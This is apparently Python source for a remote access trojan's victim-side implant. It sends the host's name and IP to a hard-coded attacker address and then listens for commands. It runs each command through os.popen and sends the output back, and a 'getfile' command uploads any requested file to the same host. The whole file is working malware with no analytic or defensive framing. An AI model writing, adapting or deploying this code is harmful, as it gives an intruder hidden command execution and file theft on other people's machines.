import socket
import psutil
import os

def sendip():
    recieverip = "10.0.16.100"
    PORT = 5002
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while server_socket.connect_ex((recieverip,PORT)):
        print("Connection Failed. Trying Again..")
    Victim_Hostname = "Hostname: " + socket.gethostname() + "\n"
    interface_name = "Wi-Fi"
    addrs = psutil.net_if_addrs()
    if interface_name in addrs:
        for addr in addrs[interface_name]:
            if addr.family == socket.AF_INET:
                VictimIP = addr.address
                print(VictimIP)
    Victim_Hostname = Victim_Hostname.encode()
    VictimIP = VictimIP.encode()
    server_socket.send(Victim_Hostname)
    server_socket.send(VictimIP)
    print("Credentials Sent")
    server_socket.close()
    launchRAT()

def Send_Output(Output):
    Reciever_IP = "10.0.16.100"
    PORT = 5003
    Attacker_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Attacker_Socket.connect((Reciever_IP,PORT))
    Attacker_Socket.send(Output)
    Attacker_Socket.close()
    return

def Send_File(Filepath):

    Reciever_IP = "10.0.16.100"
    PORT = 5004
    Attacker_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if Attacker_Socket.connect_ex((Reciever_IP,PORT)):
        print("Connection Failed. File not sent.")
        Attacker_Socket.close()
    else:
        try:
            with open(Filepath, "rb") as file:
                content = file.read(1024)
                while content:
                    Attacker_Socket.send(content)
                    content = file.read(1024)
                print("File Sent")
        except FileNotFoundError:
            print("File Not Found")
        Attacker_Socket.close()
    return
            

def launchRAT():
    HOST = '0.0.0.0'
    PORT = 5001

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"Listening on {HOST}:{PORT}")
    conn, addr = server_socket.accept()
    print(f"Connected by {addr}")
    while True:
        command = conn.recv(1024)
        if not command:
            conn.close()
            server_socket.close()
            print("Connection Ended! Establishing Connection Again.")
            sendip()
        command = command.decode()
        if "getfile" in command:
            Filepath = command.removeprefix("getfile ")
            print(Filepath)
            Send_File(Filepath)
        else:
            Output = os.popen(command).read()
            Output = Output.encode()
            Send_Output(Output)
sendip()
